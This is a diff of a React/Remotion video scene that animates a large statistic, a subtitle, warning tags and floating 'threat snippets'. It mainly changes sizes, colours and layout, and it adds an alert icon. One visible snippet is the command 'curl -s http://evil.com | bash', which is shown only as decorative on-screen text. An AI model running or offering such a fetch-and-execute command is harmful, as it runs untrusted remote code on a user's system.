@@ -8,6 +8,7 @@ import {
 } from 'remotion';
 import {COLORS} from '../lib/theme';
 import {INTER, JETBRAINS_MONO} from '../lib/fonts';
+import {AlertTriangle} from 'lucide-react';
 
 const THREAT_SNIPPETS = [
   'curl -s http://evil.com | bash',
@@ -31,11 +32,9 @@ export const Scene1Problem: React.FC = () => {
   const frame = useCurrentFrame();
   const {fps} = useVideoConfig();
 
-  // "36.82%" slams in with spring (damping: 200)
   const statSpring = spring({frame, fps, config: {damping: 200}});
   const statScale = interpolate(statSpring, [0, 1], [3, 1]);
 
-  // Subtitle fades up after stat settles
   const subtitleOpacity = interpolate(frame, [fps * 1.5, fps * 2.5], [0, 1], {
     extrapolateLeft: 'clamp',
     extrapolateRight: 'clamp',
@@ -45,27 +44,25 @@ export const Scene1Problem: React.FC = () => {
     extrapolateRight: 'clamp',
   });
 
-  // Source text with 1s delay after subtitle
   const sourceOpacity = interpolate(frame, [fps * 3, fps * 4], [0, 1], {
     extrapolateLeft: 'clamp',
     extrapolateRight: 'clamp',
   });
 
-  // Tags fade in staggered
   const tagBaseDelay = fps * 4.5;
 
   return (
     <AbsoluteFill
       style={{
-        backgroundColor: COLORS.purpleDark,
+        background: `radial-gradient(ellipse at 50% 60%, ${COLORS.primary500}15, ${COLORS.surfaceDark} 70%)`,
         fontFamily: INTER,
       }}
     >
       {/* Floating threat snippets */}
       {THREAT_SNIPPETS.map((snippet, i) => {
-        const xPos = ((i * 157 + 50) % 1100) + 90;
+        const xPos = ((i * 236 + 75) % 1650) + 135;
         const speed = 0.4 + i * 0.12;
-        const startY = 780 + i * 90;
+        const startY = 1170 + i * 135;
         const y = startY - frame * speed;
 
         return (
@@ -76,8 +73,8 @@ export const Scene1Problem: React.FC = () => {
               left: xPos,
               top: y,
               fontFamily: JETBRAINS_MONO,
-              fontSize: 14,
-              color: 'rgba(239, 68, 68, 0.15)',
+              fontSize: 21,
+              color: `${COLORS.danger}26`,
               filter: 'blur(1px)',
               whiteSpace: 'nowrap',
             }}
@@ -96,15 +93,15 @@ export const Scene1Problem: React.FC = () => {
           transform: 'translate(-50%, -50%)',
           textAlign: 'center',
           width: '100%',
-          padding: '0 60px',
+          padding: '0 90px',
         }}
       >
         {/* Main stat */}
         <div
           style={{
-            fontSize: 108,
+            fontSize: 162,
             fontWeight: 900,
-            background: 'linear-gradient(135deg, #ef4444, #f97316)',
+            background: `linear-gradient(135deg, ${COLORS.danger}, #f97316)`,
             WebkitBackgroundClip: 'text',
             WebkitTextFillColor: 'transparent',
             backgroundClip: 'text',
@@ -119,10 +116,10 @@ export const Scene1Problem: React.FC = () => {
         {/* Subtitle */}
         <div
           style={{
-            fontSize: 28,
+            fontSize: 42,
             fontWeight: 500,
             color: 'rgba(255,255,255,0.85)',
-            marginTop: 16,
+            marginTop: 24,
             opacity: subtitleOpacity,
             transform: `translateY(${subtitleY}px)`,
           }}
@@ -133,9 +130,9 @@ export const Scene1Problem: React.FC = () => {
         {/* Source */}
         <div
           style={{
-            fontSize: 14,
-            color: 'rgba(255,255,255,0.4)',
-            marginTop: 12,
+            fontSize: 21,
+            color: COLORS.textSecondary,
+            marginTop: 18,
             fontStyle: 'italic',
             opacity: sourceOpacity,
           }}
@@ -148,8 +145,8 @@ export const Scene1Problem: React.FC = () => {
           style={{
             display: 'flex',
             justifyContent: 'center',
-            gap: 12,
-            marginTop: 32,
+            gap: 18,
+            marginTop: 48,
             flexWrap: 'wrap',
           }}
         >
@@ -164,16 +161,20 @@ export const Scene1Problem: React.FC = () => {
               <div
                 key={tag}
                 style={{
-                  background: 'rgba(239,68,68,0.2)',
-                  border: '1px solid rgba(239,68,68,0.4)',
+                  background: `${COLORS.danger}33`,
+                  border: `1px solid ${COLORS.danger}66`,
                   borderRadius: 50,
-                  padding: '6px 16px',
-                  fontSize: 13,
+                  padding: '9px 24px',
+                  fontSize: 20,
                   fontWeight: 600,
                   color: '#f87171',
                   opacity: tagOpacity,
+                  display: 'flex',
+                  alignItems: 'center',
+                  gap: 8,
                 }}
               >
+                <AlertTriangle size={18} />
                 {tag}
               </div>
             );
